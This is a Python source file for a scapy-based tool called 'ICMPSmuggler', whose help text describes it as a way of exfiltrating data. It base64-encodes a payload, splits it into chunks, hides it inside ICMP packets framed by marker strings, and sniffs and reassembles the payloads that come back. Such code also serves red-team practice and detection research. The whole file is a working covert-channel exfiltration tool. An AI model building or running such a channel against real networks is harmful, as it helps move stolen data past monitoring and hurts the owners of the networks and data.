import sys
import argparse
import threading
import helper
from scapy.all import sniff, IP, ICMP, sr1, Raw, sr

SENDING_START_SEQ = "##@@!!"
SENDING_END_SEQ = "!!@@##"
RECEIVING_START_SEQ = b'IyMjIyMj'
RECEIVING_END_SEQ = b'ISEhISEh'

SESSION_BYTE = b''
SESSION_START = False
RECEIVING = True

ICMP_REPLY_CODE = 0

def receivePayload(packet):
    if packet.haslayer('ICMP') and packet['ICMP'].type == ICMP_REPLY_CODE:
        global SESSION_START
        global SESSION_BYTE
        global RECEIVING
        
        if RECEIVING_START_SEQ in packet.load:
            print
            SESSION_START = True
            SESSION_BYTE = b''

        elif RECEIVING_END_SEQ in packet.load:
            SESSION_START = False
            SESSION_BYTE = helper.decodeData(SESSION_BYTE)
            # reassemble here 
            RECEIVING = False
            
        else: 
            SESSION_BYTE += packet.load
        

def stopfilter(x): 
    global RECEIVING
    
    if not RECEIVING:
        return True
    else: 
        return False
        
def sendStaggeredPayload(args):
    encodedPayload = helper.encodeData(args.payload, args.enc)
    splittedPayloads = helper.splitPayload(encodedPayload, args.chunks)
        
    for i in splittedPayloads: 
        helper.sendPayload(args.src, args.dst, i)

def sendLumpPayload(args):
    encodedPayload = helper.encodeData(args.payload, args.enc)
    helper.sendPayload(args.src, args.dst, encodedPayload)

    

def initialiseParser():
    parser = argparse.ArgumentParser(
        prog="ICMPSmuggler",
        description="Smuggling data through ICMP"
    )
    parser.add_argument('-i', '--interface', required=True) # to implement more then one form of encoding
    parser.add_argument('-s', '--src', required=True)
    parser.add_argument('-d', '--dst', required=True)
    parser.add_argument('-p', '--payload', required=True)
    parser.add_argument('-t', '--type', choices=["lump", "staggered"] , help="Mode of exfiltrating data: \n lump: one shot send all \n staggered: send in x intervals ")
    parser.add_argument('-c', '--chunks', help="Use to dictate the number of chunks")
    parser.add_argument('-e', '--enc', default='b64') # to implement more then one form of encoding
    return parser

def send_commands(parser):
    args = parser.parse_args()
    args.payload = args.payload
    
    # send starting sequence
    helper.sendPayload(args.src, args.dst, helper.encodeData(SENDING_START_SEQ, args.enc))
    
    if args.type == "staggered":
        if not args.chunks: 
            parser.error("--interval is required when --type is set to staggered")
            sys.exit(1)
        sendStaggeredPayload(args)
       
    elif args.type == "lump":
        sendLumpPayload(args)    
    
    # send ending sequence      
    helper.sendPayload(args.src, args.dst, helper.encodeData(SENDING_END_SEQ, args.enc))
    

def start_receiver(parser): 
    global RECEIVING
    global SESSION_BYTE
    args = parser.parse_args()
    interface = args.interface
    p = sniff(filter='icmp', prn=receivePayload, store=0 , iface=interface, stop_filter=stopfilter)
    print(f"receive payload {SESSION_BYTE}")

def main(): 
    
    # intialise parser and extract out info
    parser = initialiseParser()
    
    sending_thread = threading.Thread(target=send_commands, args=(parser,))
    sending_thread.start()
    
    receiver_thread = threading.Thread(target=start_receiver, args=(parser,))
    receiver_thread.start()
    
    receiver_thread.join()
    sending_thread.join()
    
    sys.exit()
    

if __name__ == "__main__":
    main()

